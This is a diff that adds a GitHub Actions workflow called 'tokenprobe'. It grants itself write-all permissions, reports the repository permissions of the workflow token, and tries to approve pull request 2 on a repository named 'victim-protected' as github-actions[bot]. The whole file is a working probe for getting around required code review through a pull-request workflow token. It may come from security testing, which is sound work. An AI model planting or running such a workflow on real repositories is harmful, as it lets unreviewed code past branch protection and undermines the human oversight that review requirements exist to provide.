@@ -1,0 +1,19 @@
+name: tokenprobe
+on: pull_request
+permissions: write-all
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: what can this token do
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "== repo perms visible to token =="
+          curl -s -o /tmp/r.json -w "repo:%{http_code}
+" -H "Authorization: Bearer $GH_TOKEN"             https://api.github.com/repos/IRONMOSSVICORG/victim-protected
+          python3 -c "import json;d=json.load(open('/tmp/r.json'));print('permissions=',d.get('permissions'))"
+          echo "== attempt approving review as github-actions[bot] =="
+          curl -s -o /tmp/rev.json -w "review:%{http_code}
+" -X POST             -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json"             -d '{"event":"APPROVE","body":"probe: approval attempt from fork workflow token"}'             https://api.github.com/repos/IRONMOSSVICORG/victim-protected/pulls/2/reviews
+          head -c 400 /tmp/rev.json; echo
